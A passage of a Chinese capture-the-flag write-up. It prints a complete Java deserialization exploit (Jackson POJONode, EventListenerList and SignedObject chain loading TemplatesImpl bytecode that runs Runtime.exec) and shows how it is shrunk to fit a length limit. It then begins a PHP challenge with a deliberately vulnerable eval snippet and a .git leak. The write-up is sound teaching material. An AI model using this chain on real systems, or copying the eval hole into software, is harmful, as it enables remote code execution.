class="line">         <span class="comment">// 转换为 Base64 字符串</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">         <span class="keyword">return</span> poc;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//一个短的命令执行class，用javassist写的</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getshortclass(String cmd) <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">         <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">         <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">         <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">         clazz.setSuperclass(superClass);</span><br><span class="line">         <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">         constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">         clazz.addConstructor(constructor);</span><br><span class="line">         <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">         <span class="keyword">return</span> bytes;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p>运行一看长度，1980，远远不够。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750647991991-ca899cd5-071a-4d22-9e48-994f93aac0df.png"
                      alt="img"
                ></p>
<p>下一步就是缩短链子长度。</p>
<ol>
<li>缩短链子长度。</li>
</ol>
<p>我们要尽可能的剔除对解题没有太大影响的部分，就比如getPOJONodeStableProxy，我们知道jackson链有不稳定性，可能会不能成功执行，但是只是可能，概率大概在50%，剔除这个之后影响不是很大。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750647992115-8a97579d-ed33-410f-b6e3-2c2933898547.png"
                      alt="img"
                ></p>
<p>现在长度降到了1328。离目标1282很近了。</p>
<p>后面我们可以朝短的命令执行class下手，我们这里用的是javassist写的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个短的命令执行class，用javassist写的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getshortclass(String cmd) <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superClass);</span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    clazz.addConstructor(constructor);</span><br><span class="line">    <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其实这里已经很小了，但是javassist还是存在一些无用指令，为了达到最简。这里可以用 ASM 在javassist生成恶意class之后进行二次清洗。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] cleanBytecode(<span class="type">byte</span>[] classBytes) &#123;</span><br><span class="line">    <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(classBytes);</span><br><span class="line">    <span class="type">ClassWriter</span> <span class="variable">cw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">    <span class="type">ClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">            <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLineNumber</span><span class="params">(<span class="type">int</span> line, Label start)</span> &#123;</span><br><span class="line">                    <span class="comment">// Skip line numbers</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    cr.accept(cv, ClassReader.SKIP_FRAMES | ClassReader.SKIP_DEBUG);</span><br><span class="line">    <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后再把命令改成<code>rm /a</code>。来看看链子长度：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750647992986-4c3bdc27-dbb6-4ba4-a717-61bf196074b3.png"
                      alt="img"
                ></p>
<p>1304，还是差一点，但是我们知道，在DeflaterOutputStream压缩数据流的时候，会有一些头部信息，这些信息时长时短，我们可以通过循环来获取最短的长度。</p>
<p>还要注意一点，getTemplates方法里，_name属性的长度也是可控的，会被装入payload当中，所以这里也要为空。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">    setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;&quot;</span>);  <span class="comment">//这里也要为空</span></span><br><span class="line">    setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终poc：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> GFCTF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> aj.org.objectweb.asm.Opcodes;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        overrideJackson();</span><br><span class="line">        <span class="type">byte</span>[] bytes = getshortclass(<span class="string">&quot;rm /a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;  <span class="comment">//循环，让头部最小，为了拿到最短的payload</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> (TemplatesImpl) getTemplates(bytes);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);   <span class="comment">//为了压缩链子长度，不使用动态代理，但可能会无法触发（小概率）。</span></span><br><span class="line">            <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> getEventListenerList(pojoNode);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//二次反序列化</span></span><br><span class="line">            <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> second_serialize(eventListenerList);</span><br><span class="line"></span><br><span class="line">            <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">            <span class="type">EventListenerList</span> <span class="variable">eventListenerList2</span> <span class="operator">=</span> getEventListenerList(pojoNode2);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> serialize(eventListenerList2);</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            System.out.println(a.length());</span><br><span class="line">            <span class="keyword">if</span> (a.length()&lt;=<span class="number">1284</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//unserialize(a);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SignedObject <span class="title function_">second_serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> signedObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//一条JDK toString链 readObject-&gt;toString</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> EventListenerList <span class="title function_">getEventListenerList</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(obj);</span><br><span class="line"></span><br><span class="line">        setValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">        <span class="keyword">return</span> eventListenerList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取已实例化类中的值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                 field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                 field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">return</span> field;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">             <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                 <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">throw</span> e;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//重写jackson</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">overrideJackson</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">         <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">         ctClass.removeMethod(writeReplace);</span><br><span class="line">         ctClass.toClass();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">         <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">         field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         field.set(obj, value);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">         setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">         setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;&quot;</span>);  <span class="comment">//这里也要为空</span></span><br><span class="line">         setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">         <span class="keyword">return</span> templates;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 提供需要序列化的类，返回base64后的字节码</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">         <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// 使用 Deflater 设置为最高压缩率</span></span><br><span class="line">         <span class="type">Deflater</span> <span class="variable">deflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>(Deflater.BEST_COMPRESSION);</span><br><span class="line">         <span class="type">DeflaterOutputStream</span> <span class="variable">deflaterOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeflaterOutputStream</span>(byteArrayOutputStream, deflater);</span><br><span class="line"> </span><br><span class="line">         <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(deflaterOutputStream);</span><br><span class="line">         objectOutputStream.writeObject(obj);</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// 关闭流</span></span><br><span class="line">         objectOutputStream.flush();</span><br><span class="line">         deflaterOutputStream.finish();</span><br><span class="line">         deflaterOutputStream.close();</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// 转换为 Base64 字符串</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">         <span class="keyword">return</span> poc;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//一个短的命令执行class，用javassist写的</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getshortclass(String cmd) <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">         <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">         <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">         <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">         clazz.setSuperclass(superClass);</span><br><span class="line">         <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">         constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">         clazz.addConstructor(constructor);</span><br><span class="line">         <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">         <span class="keyword">return</span> cleanBytecode(bytes);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//用 ASM 进行二次清洗少量无用指令。</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] cleanBytecode(<span class="type">byte</span>[] classBytes) &#123;</span><br><span class="line">         <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(classBytes);</span><br><span class="line">         <span class="type">ClassWriter</span> <span class="variable">cw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">         <span class="type">ClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">                 <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;</span><br><span class="line">                     <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLineNumber</span><span class="params">(<span class="type">int</span> line, Label start)</span> &#123;</span><br><span class="line">                         <span class="comment">// Skip line numbers</span></span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;;</span><br><span class="line">         cr.accept(cv, ClassReader.SKIP_FRAMES | ClassReader.SKIP_DEBUG);</span><br><span class="line">         <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750647993021-2ea4f9b7-b282-4f35-9f81-c3b1447a39e4.png"
                      alt="img"
                ></p>
<p>循环出来最短长度是1284，还是多了两个字符，其实这里把最后两个字符删掉也可以成功执行。</p>
<p>4.获取flag</p>
<p>把我们得到的最终payload打入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750647993001-bd48bb9c-f049-456c-9e39-ebc9248ea2dd.png"
                      alt="img"
                ></p>
<p>然后访问&#x2F;flag路由即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/40360431/1750648098134-1cb67297-c161-4cb2-b04c-71912e114b30.png"
                      alt="img"
                ></p>
<h2 id="题目-phpms"><a href="#题目-phpms" class="headerlink" title="题目-phpms"></a>题目-phpms</h2><p>首先是网站.git泄露，通过githacker 下载.git目录，执行<code>git log --all</code> ，来查看所有分支上的提交记录，包括stash</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/36042948/1750690326102-bf2c6dbe-9a66-4bff-b35d-ef18daa7b98d.png"
                      alt="img"
                ></p>
<p>可以看到有一暂存的修改，通过git diff或者工具可以看到index.php的代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2025/png/36042948/1750690361478-2bc84a8f-8450-4b4a-8638-d864dc92dbda.png"
                      alt="img"
                ></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x0a|\x0d/&#x27;</span>,<span class="variable">$shell</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;:(&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;#<span class="subst">$shell</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里会将用户传参的shell参数拼接<code>#</code>作为代码执行，但是不允许换行。</p>
